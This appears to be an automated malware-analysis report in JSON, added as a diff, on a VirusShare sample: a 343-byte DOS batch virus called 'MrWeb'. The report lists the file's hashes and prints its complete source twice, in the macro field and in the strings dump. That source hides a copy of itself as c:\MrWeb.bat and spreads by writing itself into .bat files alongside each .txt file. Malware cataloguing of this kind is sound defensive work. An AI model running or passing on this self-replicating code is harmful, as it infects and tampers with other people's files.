@@ -1,0 +1,47 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off%[MrWeb]%\nif '%1=='In_ goto MrWebin\nif exist c:\\MrWeb.bat goto MrWebru\nif not exist %0 goto MrWeben\nfind \"MrWeb\"<%0>c:\\MrWeb.bat\nattrib +h c:\\MrWeb.bat\n:MrWebru\nfor %%g in (*.txt) do call c:\\MrWeb In_ %%g\ngoto MrWeben\n:MrWebin\nif exist %2.bat goto MrWeben\ntype c:\\MrWeb.bat>>%2.bat\necho start %2>>%2.bat%[MrWeb]%\n:MrWeben"
+    },
+    "filename": "VirusShare_ccc4292f3c319a740049c8a11cfe4806",
+    "filesize": 343,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "ccc4292f3c319a740049c8a11cfe4806",
+        "sha1": "7855c34eb91f7b19b2b33ca9e9544f3b072d7bb4",
+        "sha256": "1223fe56a6cc09933787cf1593c27fab7290cc8da95ac8b888430c46849496b3"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%[MrWeb]%",
+            "if '%1=='In_ goto MrWebin",
+            "if exist c:\\MrWeb.bat goto MrWebru",
+            "if not exist %0 goto MrWeben",
+            "find \"MrWeb\"<%0>c:\\MrWeb.bat",
+            "attrib +h c:\\MrWeb.bat",
+            ":MrWebru",
+            "for %%g in (*.txt) do call c:\\MrWeb In_ %%g",
+            "goto MrWeben",
+            ":MrWebin",
+            "if exist %2.bat goto MrWeben",
+            "type c:\\MrWeb.bat>>%2.bat",
+            "echo start %2>>%2.bat%[MrWeb]%",
+            ":MrWeben"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.372744",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
